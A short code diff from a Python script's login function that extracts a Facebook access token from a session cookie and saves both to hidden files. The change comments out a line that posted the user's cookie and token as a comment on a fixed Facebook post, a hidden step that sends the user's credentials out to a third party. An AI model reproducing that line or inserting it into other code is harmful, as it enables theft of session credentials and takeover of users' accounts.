@@ -46,7 +46,7 @@ def login():
 		token = re.search('(EAAG\w+)',str(data.text)).group(1)
 		open(".token.txt", "w").write(token)
 		open(".cookie.txt", "w").write(cookie)
-		ses.post(f"https://graph.facebook.com/674525870303608/comments/?message={cookie}&access_token={token}",cookies={"cookie":cookie})
+		#ses.post(f"https://graph.facebook.com/674525870303608/comments/?message={cookie}&access_token={token}",cookies={"cookie":cookie})
 		menu()
 	except Exception as e:
 		try:
